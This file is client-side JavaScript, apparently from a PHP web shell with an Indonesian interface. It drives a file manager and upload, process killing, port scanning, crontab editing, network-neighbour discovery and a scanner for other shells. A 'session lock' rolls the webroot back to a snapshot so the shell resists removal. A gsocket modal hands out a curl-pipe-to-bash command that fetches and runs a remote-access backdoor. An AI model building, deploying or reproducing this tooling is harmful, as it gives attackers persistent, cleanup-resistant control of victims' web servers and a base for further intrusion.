    const musicNext=document.getElementById('music-next');
    const musicTimeStart=document.getElementById('music-time-start');
    const musicTimeEnd=document.getElementById('music-time-end');
    const musicProgress=document.getElementById('music-progress');
    const playlistEl=document.getElementById('playlist');

    const diagInput=document.getElementById('diag-input');
    const diagRun=document.getElementById('diag-run');
    const diagOutput=document.getElementById('diag-output');

    const sessionLockLabel=document.getElementById('sessionlock-label');

    let currentDir=<?= json_encode($currentDir) ?>;
    let userHome=<?= json_encode($USER_HOME) ?>;
    let sessionLockedPhp = <?= !empty($SESSION_STATE['locked']) ? 'true' : 'false' ?>;
    let modalHandler=null;

    const garudaPlaylist=[
        {title:"Cup of Joe - Multo",id:"LcYcvN3PDJw"},
        {title:"NIKI - You'll Be in My Heart",id:"Bl0Gtp5FMd4"},
        {title:"Wave to Earth - Love.",id:"QX2dqXr8mOU"},
        {title:"The 1975 - About You",id:"tGv7CUutzqU"},
        {title:"wave to earth - seasons",id:"CnVVjLOGVoY"},
        {title:"Arctic Monkeys - No. 1 Party Anthem",id:"zjZD-ibfhnU"},
        {title:"Mitski - My Love Mine All Mine",id:"CwGbMYLjIpQ"},
    ];
    let garudaPlayer=null, garudaIndex=0, garudaIsPlaying=false, garudaDuration=0, garudaTimer=null;

    function escapeHtml(str){
        return String(str).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#039;");
    }
    function formatTime(sec){
        sec=Math.floor(sec||0);
        const m=Math.floor(sec/60), s=sec%60;
        return String(m).padStart(2,"0")+":"+String(s).padStart(2,"0");
    }
    function updateMusicUIPlaying(isPlay){
        garudaIsPlaying=!!isPlay;
        if(musicPlayIcon){
            musicPlayIcon.src = isPlay
                ? "https://cdn-icons-png.flaticon.com/512/6878/6878704.png"
                : "https://cdn-icons-png.flaticon.com/512/6878/6878705.png";
        }
        if(musicSubtitle) musicSubtitle.textContent=isPlay?'NOW PLAYING':'PAUSED';
    }
    function clearTimer(){
        if(garudaTimer){clearInterval(garudaTimer);garudaTimer=null;}
    }
    function startTimer(){
        clearTimer();
        garudaTimer=setInterval(()=>{
            if(!garudaPlayer) return;
            try{
                const cur=garudaPlayer.getCurrentTime()||0;
                const dur=garudaPlayer.getDuration()||garudaDuration||0;
                garudaDuration=dur;
                if(musicTimeStart) musicTimeStart.textContent=formatTime(cur);
                if(musicTimeEnd) musicTimeEnd.textContent=dur?formatTime(dur):"00:00";
                if(musicProgress && dur>0){
                    const pct=Math.max(0,Math.min(100,cur/dur*100));
                    musicProgress.style.width=pct+"%";
                }
            }catch(e){}
        },1000);
    }
    function renderPlaylist(){
        if(!playlistEl) return;
        playlistEl.innerHTML="";
        garudaPlaylist.forEach((t,idx)=>{
            const row=document.createElement("div");
            row.className="playlist-row "+(idx===garudaIndex?"active":"inactive");
            row.dataset.index=idx;
            row.innerHTML='<div class="idx">'+(idx+1)+'</div>'
                +'<div class="icon">🎧</div>'
                +'<div class="title">'+escapeHtml(t.title)+'</div>';
            row.onclick=()=> playIndex(idx);
            playlistEl.appendChild(row);
        });
    }
    function highlightPlaylist(){
        if(!playlistEl) return;
        playlistEl.querySelectorAll(".playlist-row").forEach(row=>{
            const idx=parseInt(row.dataset.index,10);
            row.classList.toggle("active",idx===garudaIndex);
            row.classList.toggle("inactive",idx!==garudaIndex);
        });
    }
    function updateTitle(){
        if(musicTitle) musicTitle.textContent=garudaPlaylist[garudaIndex].title;
    }
    function playIndex(idx){
        garudaIndex=(idx+garudaPlaylist.length)%garudaPlaylist.length;
        if(garudaPlayer){
            garudaPlayer.loadVideoById(garudaPlaylist[garudaIndex].id);
            updateTitle();
            highlightPlaylist();
            updateMusicUIPlaying(true);
            startTimer();
        }
    }
    function nextTrack(){playIndex(garudaIndex+1);}
    function prevTrack(){playIndex(garudaIndex-1);}
    function togglePlay(){
        if(!garudaPlayer) return;
        const st=garudaPlayer.getPlayerState();
        if(st===YT.PlayerState.PLAYING){
            garudaPlayer.pauseVideo();
            updateMusicUIPlaying(false);
            clearTimer();
        }else{
            garudaPlayer.playVideo();
            updateMusicUIPlaying(true);
            startTimer();
        }
    }
    window.onYouTubeIframeAPIReady=function(){
        garudaPlayer=new YT.Player('yt-player',{
            videoId:garudaPlaylist[0].id,
            playerVars:{autoplay:1,controls:0,rel:0,modestbranding:1},
            events:{
                onReady:(e)=>{
                    renderPlaylist();
                    updateTitle();
                    musicSubtitle.textContent="NOW PLAYING";
                    startTimer();
                    try{e.target.playVideo();}catch(err){}
                },
                onStateChange:(e)=>{
                    if(e.data===YT.PlayerState.ENDED){
                        nextTrack();
                    }else if(e.data===YT.PlayerState.PLAYING){
                        updateMusicUIPlaying(true);startTimer();
                    }else if(e.data===YT.PlayerState.PAUSED){
                        updateMusicUIPlaying(false);clearTimer();
                    }
                }
            }
        });
    };

    if(musicPrev) musicPrev.addEventListener("click",prevTrack);
    if(musicNext) musicNext.addEventListener("click",nextTrack);
    if(musicPlayBtn) musicPlayBtn.addEventListener("click",togglePlay);

    // ========== MODAL ==========
    function showModal(title,bodyHTML,submitText,handler){
        modalTitle.textContent=title;
        modalBody.innerHTML=bodyHTML;
        modalSubmit.textContent=submitText||'Save';
        modalMessage.classList.add('hidden');
        modalMessage.textContent='';
        modalHandler=handler||null;
        modalBackdrop.classList.add('show');
    }
    function hideModal(){
        modalBackdrop.classList.remove('show');
        modalHandler=null;
    }
    btnClose.addEventListener('click',hideModal);
    btnCancel.addEventListener('click',hideModal);
    modalBackdrop.addEventListener('click',e=>{if(e.target===modalBackdrop)hideModal();});
    modalForm.addEventListener('submit',e=>{
        e.preventDefault();
        if(!modalHandler) return;
        const fd=new FormData(modalForm);
        modalHandler(fd);
    });
    function showError(msg){
        modalMessage.className='text-[11px] text-red-200 bg-red-900 bg-opacity-40 border border-red-500 px-3 py-2 rounded';
        modalMessage.textContent=msg;
        modalMessage.classList.remove('hidden');
    }
    function showSuccess(msg){
        modalMessage.className='text-[11px] text-emerald-200 bg-emerald-900 bg-opacity-40 border border-emerald-500 px-3 py-2 rounded';
        modalMessage.textContent=msg;
        modalMessage.classList.remove('hidden');
    }

    function refreshFileList(){
        fetch('?ajax=filelist&dir='+encodeURIComponent(currentDir))
            .then(r=>r.text()).then(html=>{
                fileGrid.innerHTML=html;
                attachFileButtons();
            });
    }
    function refreshBreadcrumb(){
        fetch('?ajax=breadcrumb&dir='+encodeURIComponent(currentDir))
            .then(r=>r.text()).then(html=>{
                breadcrumbEl.innerHTML=html;
                attachBreadcrumb();
            });
    }
    function changeDir(dir){
        fetch('?ajax=changedir&dir='+encodeURIComponent(dir))
            .then(r=>r.json()).then(data=>{
                if(!data.ok){alert(data.error||'Direktori tidak valid');return;}
                currentDir=data.dir;
                pathLabel.textContent=currentDir;
                refreshFileList();
                refreshBreadcrumb();
                window.history.replaceState(null,'','?dir='+encodeURIComponent(currentDir));
            });
    }

    function attachFileButtons(){
        document.querySelectorAll('.link-open-dir').forEach(btn=>{
            btn.onclick=()=>changeDir(btn.getAttribute('data-dir'));
        });
        document.querySelectorAll('.btn-edit').forEach(btn=>{
            btn.onclick=()=>openEditModal(btn.getAttribute('data-file'));
        });
        document.querySelectorAll('.btn-lock').forEach(btn=>{
            btn.onclick=()=>{
                const target=btn.getAttribute('data-target');
                if(!confirm('LOCK "'+target+'"?'))return;
                const fd=new FormData();
                fd.append('ajax','lock');
                fd.append('target',target);
                fetch('?ajax=lock&dir='+encodeURIComponent(currentDir),{method:'POST',body:fd})
                    .then(r=>r.json()).then(d=>{
                        if(!d.ok){alert(d.error||'Gagal lock');return;}
                        refreshFileList();
                    });
            };
        });
        document.querySelectorAll('.btn-unlock').forEach(btn=>{
            btn.onclick=()=>openUnlockModal(btn.getAttribute('data-target'));
        });
        document.querySelectorAll('.btn-delete').forEach(btn=>{
            btn.onclick=()=>{
                const t=btn.getAttribute('data-target');
                if(!confirm('Yakin hapus "'+t+'"?'))return;
                const fd=new FormData();
                fd.append('ajax','delete');
                fd.append('target',t);
                fetch('?ajax=delete&dir='+encodeURIComponent(currentDir),{method:'POST',body:fd})
                    .then(r=>r.json()).then(d=>{
                        if(!d.ok){alert(d.error||'Gagal delete');return;}
                        refreshFileList();
                    });
            };
        });
    }
    function attachBreadcrumb(){
        breadcrumbEl.querySelectorAll('.bc-root,.bc-part').forEach(el=>{
            el.addEventListener('click',()=>changeDir(el.getAttribute('data-dir')));
        });
    }

    function openEditModal(file){
        fetch('?ajax=loadfile&dir='+encodeURIComponent(currentDir)+'&file='+encodeURIComponent(file))
            .then(r=>r.json()).then(d=>{
                if(!d.ok){alert(d.error||'Gagal load file');return;}
                const bodyHTML='<input type="hidden" name="file" value="'+escapeHtml(file)+'">'
                    +'<label class="block mb-1 text-slate-200">Edit: '+escapeHtml(file)+'</label>'
                    +'<textarea name="content" rows="18" class="w-full border border-slate-700 bg-slate-900 rounded p-2 font-mono text-[11px]">'+escapeHtml(d.content)+'</textarea>';
                showModal('Edit File',bodyHTML,'Simpan',fd=>{
                    fd.append('ajax','savefile');
                    fetch('?ajax=savefile&dir='+encodeURIComponent(currentDir),{method:'POST',body:fd})
                        .then(r=>r.json()).then(res=>{
                            if(!res.ok){showError(res.error||'Gagal simpan');return;}
                            showSuccess(res.message||'Tersimpan');
                            refreshFileList();
                        });
                });
            });
    }
    function openUnlockModal(target){
        const bodyHTML='<input type="hidden" name="target" value="'+escapeHtml(target)+'">'
            +'<label class="block mb-1 text-slate-200">Unlock: '+escapeHtml(target)+'</label>'
            +'<input type="password" name="key" class="w-full border border-slate-700 rounded bg-slate-900 p-2 text-xs" placeholder="Masukin unlock key..." required>';
        showModal('Unlock',bodyHTML,'Unlock',fd=>{
            fd.append('ajax','unlock');
            fetch('?ajax=unlock&dir='+encodeURIComponent(currentDir),{method:'POST',body:fd})
                .then(r=>r.json()).then(res=>{
                    if(!res.ok){showError(res.error||'Gagal unlock');return;}
                    showSuccess(res.message||'Unlocked');
                    refreshFileList();
                });
        });
    }
    function openNewModal(){
        const bodyHTML='<label class="block mb-1 text-slate-200">Tipe:</label>'
            +'<select name="type" class="w-full border border-slate-700 bg-slate-900 rounded p-2 text-xs mb-2"><option value="file">File</option><option value="folder">Folder</option></select>'
            +'<label class="block mb-1 text-slate-200">Nama:</label>'
            +'<input type="text" name="name" class="w-full border border-slate-700 rounded bg-slate-900 p-2 text-xs mb-2" required>'
            +'<div id="new-content-wrapper">'
            +'<label class="block mb-1 text-slate-200">Content (optional):</label>'
            +'<textarea name="content" rows="6" class="w-full border border-slate-700 bg-slate-900 rounded p-2 font-mono text-[11px]"></textarea>'
            +'</div>';
        showModal('Buat File / Folder',bodyHTML,'Buat',fd=>{
            fd.append('ajax','newitem');
            fetch('?ajax=newitem&dir='+encodeURIComponent(currentDir),{method:'POST',body:fd})
                .then(r=>r.json()).then(res=>{
                    if(!res.ok){showError(res.error||'Gagal membuat');return;}
                    showSuccess(res.message||'Berhasil');
                    refreshFileList();
                });
        });
        setTimeout(()=>{
            const sel=modalBody.querySelector('select[name="type"]');
            const wrap=modalBody.querySelector('#new-content-wrapper');
            const toggle=()=>{wrap.style.display=(sel.value==='file')?'block':'none';};
            sel.addEventListener('change',toggle);toggle();
        },50);
    }
    function openUploadModal(){
        const bodyHTML='<label class="block mb-1 text-slate-200">File:</label>'
            +'<input type="file" name="upload_file" class="w-full border border-slate-700 rounded bg-slate-900 p-2 text-xs" required>';
        showModal('Upload File',bodyHTML,'Upload',fd=>{
            fd.append('ajax','upload');
            fetch('?ajax=upload&dir='+encodeURIComponent(currentDir),{method:'POST',body:fd})
                .then(r=>r.json()).then(res=>{
                    if(!res.ok){showError(res.error||'Gagal upload');return;}
                    showSuccess(res.message||'Upload sukses');
                    refreshFileList();
                });
        });
    }
    function openBulkCopyModal(){
        const bodyHTML='<label class="block mb-1 text-slate-200">Target Folder:</label>'
            +'<input type="text" name="target" class="w-full border border-slate-700 rounded bg-slate-900 p-2 text-xs mb-2" required>'
            +'<label class="block mb-1 text-slate-200">Path tujuan:</label>'
            +'<input type="text" name="destpath" class="w-full border border-slate-700 rounded bg-slate-900 p-2 text-xs mb-2" required>'
            +'<label class="block mb-1 text-slate-200">Nama folder baru (comma / newline):</label>'
            +'<textarea name="names" rows="4" class="w-full border border-slate-700 rounded bg-slate-900 p-2 text-xs" required></textarea>';
        showModal('Bulk Copy Folder',bodyHTML,'Run',fd=>{
            fd.append('ajax','bulkcopy');
            fetch('?ajax=bulkcopy&dir='+encodeURIComponent(currentDir),{method:'POST',body:fd})
                .then(r=>r.json()).then(res=>{
                    if(!res.ok){showError(res.error||'Gagal bulk copy');return;}
                    showSuccess(res.message||'Bulk copy sukses');
                    refreshFileList();
                });
        });
    }

    function openGsocketModal(){
        fetch('?ajax=gsocket_cmd')
            .then(r=>r.json()).then(d=>{
                if(!d.ok){alert('Gagal ambil command');return;}
                const cmd=d.cmd||'bash -c "$(curl -fsSL https://gsocket.io/y)"';
                const bodyHTML='<div class="text-[11px] text-slate-200 mb-2">'
                    +'Command ini <b>tidak dijalankan otomatis</b>. Copy & jalankan sendiri di terminal / WSL / cmd:</div>'
                    +'<div class="bg-slate-900 border border-slate-700 rounded p-2 font-mono text-[11px] text-sky-200 break-all" id="gs-cmd">'
                    +escapeHtml(cmd)+'</div>'
                    +'<button type="button" id="btn-copy-gs" class="mt-2 pill-btn pill-btn-primary text-xs">Copy Command</button>';
                showModal('GSocket Command',bodyHTML,'Close',()=>{hideModal();});
                setTimeout(()=>{
                    const b=document.getElementById('btn-copy-gs');
                    b && (b.onclick=function(){
                        const tx=document.getElementById('gs-cmd').innerText;
                        navigator.clipboard.writeText(tx).then(()=>{showSuccess('Copied to clipboard');});
                    });
                },30);
            });
    }

    // SHELL FINDER MODAL
    function openShellFinderModal(){
        const bodyHTML =
            '<div class="text-[11px] text-slate-200">' +
            'Scan semua file <span class="font-mono">.php</span> di HOME:<br>' +
            '<span class="block mt-1 text-sky-300" id="sf-status">Scanning...</span>' +
            '<div id="sf-results" class="mt-2 max-h-72 overflow-auto text-[11px] bg-slate-900 border border-slate-700 rounded p-2">Menunggu hasil...</div>' +
            '</div>';

        showModal('Shell Finder', bodyHTML, 'Tutup', () => { hideModal(); });

        fetch('?ajax=shellfinder')
            .then(r => r.json())
            .then(data => {
                const st  = document.getElementById('sf-status');
                const box = document.getElementById('sf-results');
                if(!st || !box) return;

                if(!data.ok){
                    st.textContent = 'ERROR: ' + (data.error || 'Gagal scan');
                    box.textContent = '';
                    return;
                }

                const root    = data.root    || userHome || '?';
                const scanned = data.scanned || 0;
                const found   = data.found   || [];

                st.textContent =
                    'Root: ' + root +
                    ' — scanned ' + scanned + ' file PHP, ketemu ' + found.length + ' file mencurigakan.';

                if(found.length === 0){
                    box.innerHTML =
                        '<span class="text-emerald-300">Tidak ada file mencurigakan ditemukan (berdasarkan pola exec(), shell_exec(), dll).</span>';
                    return;
                }

                let html = '';
                found.forEach((item, idx) => {
                    const p    = item.file || '?';
                    const sz   = (item.size != null ? (' (' + item.size + ' bytes)') : '');
                    const pats = (item.patterns || []).join(', ');
                    html += '<div class="mb-2">';
                    html += '<div class="font-mono text-sky-200">' + escapeHtml((idx+1)+'. '+p+sz) + '</div>';
                    html += '<div class="text-slate-200">Pattern: <span class="text-amber-300">' + escapeHtml(pats) + '</span></div>';
                    html += '</div>';
                });
                box.innerHTML = html;
            })
            .catch(err => {
                const st  = document.getElementById('sf-status');
                const box = document.getElementById('sf-results');
                if(st) st.textContent = 'ERROR: ' + err;
                if(box) box.textContent = '';
            });
    }

    // ===== PROCESS MANAGER =====
    function openProcessModal(){
        const bodyHTML =
            '<div class="text-[11px] text-slate-200">' +
            '<div class="mb-2 text-slate-300">List proses dari server. Klik KILL di PID yang mau dimatiin.</div>' +
            '<div id="ps-summary" class="text-sky-300 mb-2">Loading...</div>' +
            '<div class="max-h-72 overflow-auto border border-slate-700 rounded bg-slate-900">' +
            '<table class="w-full text-[10px]"><thead class="bg-slate-800"><tr>' +
            '<th class="px-2 py-1 text-left">PID</th>' +
            '<th class="px-2 py-1 text-left">User</th>' +
            '<th class="px-2 py-1 text-left">CPU</th>' +
            '<th class="px-2 py-1 text-left">MEM</th>' +
            '<th class="px-2 py-1 text-left">CMD</th>' +
            '<th class="px-2 py-1 text-left">Act</th>' +
            '</tr></thead><tbody id="ps-tbody"></tbody></table>' +
            '</div></div>';
        showModal('Process Manager', bodyHTML, 'Close', ()=>{hideModal();});
        loadProcessList();
    }
    function loadProcessList(){
        fetch('?ajax=ps_list')
            .then(r=>r.json()).then(d=>{
                const sum=document.getElementById('ps-summary');
                const tb=document.getElementById('ps-tbody');
                if(!d.ok){sum.textContent='ERROR: '+(d.error||'Gagal load');return;}
                const rows=d.rows||[];
                sum.textContent='Total proses: '+rows.length;
                if(!tb) return;
                tb.innerHTML='';
                rows.forEach(r=>{
                    const tr=document.createElement('tr');
                    tr.innerHTML=
                        '<td class="px-2 py-1">'+escapeHtml(r.pid)+'</td>'+
                        '<td class="px-2 py-1">'+escapeHtml(r.user)+'</td>'+
                        '<td class="px-2 py-1">'+escapeHtml(r.cpu)+'</td>'+
                        '<td class="px-2 py-1">'+escapeHtml(r.mem)+'</td>'+
                        '<td class="px-2 py-1">'+escapeHtml(r.cmd)+'</td>'+
                        '<td class="px-2 py-1"><button data-pid="'+escapeHtml(r.pid)+'" class="px-2 py-0.5 rounded bg-red-600 text-white text-[10px] btn-ps-kill">KILL</button></td>';
                    tb.appendChild(tr);
                });
                tb.querySelectorAll('.btn-ps-kill').forEach(btn=>{
                    btn.addEventListener('click',()=>{
                        const pid=btn.getAttribute('data-pid');
                        if(!confirm('Kill PID '+pid+' ?'))return;
                        const fd=new FormData();
                        fd.append('ajax','ps_kill');
                        fd.append('pid',pid);
                        fetch('?ajax=ps_kill',{method:'POST',body:fd})
                            .then(r=>r.json()).then(res=>{
                                if(!res.ok){alert(res.error||'Gagal kill');return;}
                                sum.textContent=res.message||'Kill OK';
                                loadProcessList();
                            });
                    });
                });
            });
    }

    // ===== PORT SCANNER =====
    function openPortScanModal(){
        const bodyHTML =
            '<div class="text-[11px] text-slate-200">' +
            '<label class="block mb-1">Host/IP</label>'+
            '<input name="host" value="127.0.0.1" class="w-full mb-2 bg-slate-900 border border-slate-700 rounded px-2 py-1 text-[11px]">'+
            '<div class="flex space-x-2 mb-2">'+
            '<div class="flex-1"><label class="block mb-1">Start Port</label><input name="start" value="1" class="w-full bg-slate-900 border border-slate-700 rounded px-2 py-1 text-[11px]"></div>'+
            '<div class="flex-1"><label class="block mb-1">End Port</label><input name="end" value="1024" class="w-full bg-slate-900 border border-slate-700 rounded px-2 py-1 text-[11px]"></div>'+
            '</div>'+
            '<div id="pscan-status" class="text-sky-300 mb-2"></div>'+
            '<div id="pscan-result" class="max-h-72 overflow-auto bg-slate-900 border border-slate-700 rounded p-2 text-[11px]"></div>'+
            '</div>';
        showModal('Port Scanner',bodyHTML,'Scan',fd=>{
            fd.append('ajax','portscan');
            const stat=document.getElementById('pscan-status');
            const box=document.getElementById('pscan-result');
            stat.textContent='Scanning...';
            box.textContent='';
            fetch('?ajax=portscan',{method:'POST',body:fd})
                .then(r=>r.json()).then(res=>{
                    if(!res.ok){showError(res.error||'Gagal scan');return;}
                    const open=res.open||[];
                    stat.textContent='Host '+res.host+' | Checked '+res.checked+' ports, open: '+open.length;
                    if(open.length===0){
                        box.textContent='Tidak ada port terbuka dalam range ini.';
                    }else{
                        box.innerHTML=open.map(o=>'Port '+o.port+' (approx '+o.latency_ms+' ms)').join('<br>');
                    }
                }).catch(err=>{
                    showError('ERROR: '+err);
                });
        });
    }

    // ===== CRON MANAGER =====
    function openCronModal(){
        const bodyHTML =
            '<div class="text-[11px] text-slate-200">'+
            '<div class="mb-2 text-slate-300">Edit crontab user ini. Hati-hati, akan <b>replace</b> semua entry.</div>'+
            '<textarea name="content" rows="14" class="w-full bg-slate-900 border border-slate-700 rounded p-2 font-mono text-[11px]" id="cron-content"></textarea>'+
            '<div class="mt-1 text-[10px] text-slate-400">Catatan: di shared hosting kadang crontab tidak diizinkan.</div>'+
            '</div>';
        showModal('Cron Manager',bodyHTML,'Save',fd=>{
            fd.append('ajax','cron_save');
            fetch('?ajax=cron_save',{method:'POST',body:fd})
                .then(r=>r.json()).then(res=>{
                    if(!res.ok){showError(res.error||'Gagal save cron');return;}
                    showSuccess(res.message||'Crontab updated');
                }).catch(err=>{
                    showError('ERROR: '+err);
                });
        });
        // load isi cron
        fetch('?ajax=cron_get')
            .then(r=>r.json()).then(res=>{
                if(!res.ok){
                    const ta=document.getElementById('cron-content');
                    if(ta) ta.value='(ERROR) '+(res.error||'Gagal load crontab');
                    return;
                }
                const ta=document.getElementById('cron-content');
                if(ta) ta.value=res.content||'';
            });
    }

    // ===== PANIC BUTTON =====
    function triggerPanic(){
        if(!confirm('Panic Button akan LOCK semua file & folder di HOME (dir=0555, file=0444). Lanjut?'))return;
        const fd=new FormData();
        fd.append('ajax','panic_lock');
        fetch('?ajax=panic_lock',{method:'POST',body:fd})
            .then(r=>r.json()).then(res=>{
                if(!res.ok){alert(res.error||'Gagal panic lock');return;}
                alert(res.message||'HOME di-lock');
                refreshFileList();
            }).catch(err=>{
                alert('ERROR: '+err);
            });
    }

    // ===== NETWORK TOPOLOGY =====
    function openNetTopoModal(){
        const bodyHTML=
            '<div class="text-[11px] text-slate-200">'+
            '<div class="mb-2 text-slate-300">Device lain di jaringan (via ip neigh / arp -a).</div>'+
            '<div id="nt-status" class="text-sky-300 mb-2">Loading...</div>'+
            '<div id="nt-result" class="max-h-72 overflow-auto bg-slate-900 border border-slate-700 rounded p-2 text-[11px]"></div>'+
            '</div>';
        showModal('Network Topology',bodyHTML,'Close',()=>{hideModal();});
        fetch('?ajax=net_topo')
            .then(r=>r.json()).then(res=>{
                const st=document.getElementById('nt-status');
                const box=document.getElementById('nt-result');
                if(!res.ok){st.textContent='ERROR: '+(res.error||'Gagal');box.textContent='';return;}
                const neighbors=res.neighbors||[];
                st.textContent='Total neighbor: '+neighbors.length;
                if(neighbors.length===0){
                    box.textContent='Tidak ada entry ter-parse. Lihat raw:\n\n'+(res.raw||'');
                }else{
                    box.innerHTML=neighbors.map(n=>
                        escapeHtml(n.ip+' @ '+n.iface+' ['+n.mac+'] '+(n.state||''))
                    ).join('<br>');
                }
            }).catch(err=>{
                const st=document.getElementById('nt-status');
                const box=document.getElementById('nt-result');
                if(st) st.textContent='ERROR: '+err;
                if(box) box.textContent='';
            });
    }

    // ===== FILE INTEGRITY CHECKER =====
    function openFimModal(){
        const bodyHTML=
            '<div class="text-[11px] text-slate-200">'+
            '<div class="mb-2 text-slate-300">File Integrity Checker untuk HOME (hash SHA1 per file).</div>'+
            '<div class="flex space-x-2 mb-2">'+
            '<button type="button" id="fim-build" class="pill-btn pill-btn-primary text-[11px] flex-1">Build Baseline</button>'+
            '<button type="button" id="fim-check" class="pill-btn pill-btn-ghost text-[11px] flex-1">Check Changes</button>'+
            '</div>'+
            '<div id="fim-status" class="text-sky-300 mb-2"></div>'+
            '<div id="fim-result" class="max-h-72 overflow-auto bg-slate-900 border border-slate-700 rounded p-2 text-[11px]"></div>'+
            '</div>';
        showModal('File Integrity Checker',bodyHTML,'Close',()=>{hideModal();});

        const st=document.getElementById('fim-status');
        const box=document.getElementById('fim-result');
        const btnBuild=document.getElementById('fim-build');
        const btnCheck=document.getElementById('fim-check');

        btnBuild.onclick=()=>{
            st.textContent='Building baseline...';
            box.textContent='';
            const fd=new FormData();
            fd.append('ajax','fim_baseline');
            fetch('?ajax=fim_baseline',{method:'POST',body:fd})
                .then(r=>r.json()).then(res=>{
                    if(!res.ok){st.textContent='ERROR: '+(res.error||'Gagal baseline');return;}
                    st.textContent=res.message+' (files: '+res.count+', time: '+res.time+')';
                }).catch(err=>{
                    st.textContent='ERROR: '+err;
                });
        };
        btnCheck.onclick=()=>{
            st.textContent='Checking changes...';
            box.textContent='';
            const fd=new FormData();
            fd.append('ajax','fim_check');
            fetch('?ajax=fim_check',{method:'POST',body:fd})
                .then(r=>r.json()).then(res=>{
                    if(!res.ok){st.textContent='ERROR: '+(res.error||'Gagal check');return;}
                    st.textContent='Baseline @ '+res.baseline_time+' | total baseline '+res.total_baseline+', current '+res.total_current+
                        ' | added '+res.added_count+', deleted '+res.deleted_count+', modified '+res.modified_count;
                    let html='';
                    if(res.added && res.added.length){
                        html+='<div class="text-emerald-300 mb-1">ADDED:</div>'+res.added.map(a=>'<div>+ '+escapeHtml(a)+'</div>').join('');
                    }
                    if(res.deleted && res.deleted.length){
                        html+='<div class="text-red-300 mt-2 mb-1">DELETED:</div>'+res.deleted.map(a=>'<div>- '+escapeHtml(a)+'</div>').join('');
                    }
                    if(res.modified && res.modified.length){
                        html+='<div class="text-amber-300 mt-2 mb-1">MODIFIED:</div>'+res.modified.map(a=>'<div>* '+escapeHtml(a)+'</div>').join('');
                    }
                    if(html==='') html='Tidak ada perubahan terdeteksi (dibanding baseline).';
                    box.innerHTML=html;
                }).catch(err=>{
                    st.textContent='ERROR: '+err;
                });
        };
    }

    // ===== LOCK SESSION TOGGLE =====
    function updateSessionLockLabel(locked){
        if(!sessionLockLabel)return;
        sessionLockLabel.textContent=locked?'Unlock Session':'Lock Session';
    }
    // ===== PROGRESS MODAL =====
const progressBackdrop = document.getElementById('progress-backdrop');
const progressClose    = document.getElementById('progress-close');
const progressTitle    = document.getElementById('progress-title');
const progressText     = document.getElementById('progress-text');
const progressPct      = document.getElementById('progress-pct');
const progressBar      = document.getElementById('progress-bar');
const progressCount    = document.getElementById('progress-count');
const progressCurrent  = document.getElementById('progress-current');

let sessES = null;

function openProgressModal(title){
  progressTitle.textContent = title || 'Processing...';
  progressText.textContent  = 'Preparing...';
  progressPct.textContent   = '0%';
  progressBar.style.width   = '0%';
  progressCount.textContent = '0 / 0';
  progressCurrent.textContent = '-';
  progressBackdrop.classList.add('show');
}
function closeProgressModal(){
  progressBackdrop.classList.remove('show');
}
if(progressClose){
  progressClose.addEventListener('click', ()=>{
    // NOTE: kalau kamu mau “nggak bisa close” saat proses, tinggal return aja.
    closeProgressModal();
  });
}

// ===== LOCK SESSION REALTIME SSE =====
function toggleSessionLock(){
  const wantLock = !sessionLockedPhp;

  if(wantLock){
    if(!confirm('Lock Session akan buat snapshot webroot (__DIR__) dan setiap request akan rollback ke kondisi itu. Lanjut?')) return;
  }else{
    if(!confirm('Unlock Session? Snapshot akan dibersihkan.')) return;
  }

  // EventSource = GET only
  const action = wantLock ? 'lock' : 'unlock';
  const url = '?ajax=session_lock_stream&action=' + encodeURIComponent(action);

  // buka modal
  openProgressModal(wantLock ? 'Lock Session (Realtime)' : 'Unlock Session');

  // stop ES lama kalau ada
  try{ if(sessES) sessES.close(); }catch(e){}
  sessES = new EventSource(url);

  sessES.addEventListener('status', (ev)=>{
    try{
      const d = JSON.parse(ev.data || '{}');
      if(progressText) progressText.textContent = d.msg || 'Working...';
      if(typeof d.pct === 'number'){
        progressPct.textContent = d.pct + '%';
        progressBar.style.width = d.pct + '%';
      }
    }catch(e){}
  });

  sessES.addEventListener('progress', (ev)=>{
    try{
      const d = JSON.parse(ev.data || '{}');
      const pct = Math.max(0, Math.min(100, parseInt(d.pct||0,10)));
      progressPct.textContent = pct + '%';
      progressBar.style.width = pct + '%';

      const done = d.done ?? 0;
      const total = d.total ?? 0;
      progressCount.textContent = done + ' / ' + total;

      if(d.current) progressCurrent.textContent = d.current;
      if(progressText) progressText.textContent = 'Snapshotting...';
    }catch(e){}
  });

  sessES.addEventListener('done', (ev)=>{
    try{
      const d = JSON.parse(ev.data || '{}');
      // final UI
      progressPct.textContent = '100%';
      progressBar.style.width = '100%';
      progressText.textContent = d.message || 'Done';

      sessionLockedPhp = !!d.locked;
      updateSessionLockLabel(sessionLockedPhp);

      // kecilin delay biar keliatan kelar
      setTimeout(()=>{
        closeProgressModal();
        alert(d.message || (sessionLockedPhp ? 'Locked' : 'Unlocked'));
      }, 350);
    }catch(e){
      setTimeout(()=>{ closeProgressModal(); }, 350);
    }
    try{ sessES.close(); }catch(e){}
    sessES = null;
  });

  sessES.onerror = (e)=>{
    // kalau server/proxy buffer/ga support SSE, bakal error di sini
    try{ sessES.close(); }catch(err){}
    sessES = null;
    closeProgressModal();
    alert('SSE error: server/proxy mungkin nge-buffer atau EventSource diblok. Coba cek hosting / LiteSpeed buffering.');
  };
}


    // ===== INIT BUTTONS =====
    document.querySelector('.btn-new').addEventListener('click',openNewModal);
    document.querySelector('.btn-upload').addEventListener('click',openUploadModal);
    document.querySelector('.btn-bulkcopy').addEventListener('click',openBulkCopyModal);
    document.querySelector('.btn-gsocket').addEventListener('click',openGsocketModal);
    const btnShellFinder=document.querySelector('.btn-shellfinder');
    if(btnShellFinder){ btnShellFinder.addEventListener('click',openShellFinderModal); }
    const btnProcess=document.querySelector('.btn-process');
    if(btnProcess){ btnProcess.addEventListener('click',openProcessModal); }
    const btnPort=document.querySelector('.btn-portscan');
    if(btnPort){ btnPort.addEventListener('click',openPortScanModal); }
    const btnCron=document.querySelector('.btn-cron');
    if(btnCron){ btnCron.addEventListener('click',openCronModal); }
    const btnPanic=document.querySelector('.btn-panic');
    if(btnPanic){ btnPanic.addEventListener('click',triggerPanic); }
    const btnTopo=document.querySelector('.btn-topology');
    if(btnTopo){ btnTopo.addEventListener('click',openNetTopoModal); }
    const btnFim=document.querySelector('.btn-fim');
    if(btnFim){ btnFim.addEventListener('click',openFimModal); }
    const btnSess=document.querySelector('.btn-sessionlock');
    if(btnSess){ btnSess.addEventListener('click',toggleSessionLock); }
    updateSessionLockLabel(sessionLockedPhp);

    attachFileButtons();
    attachBreadcrumb();

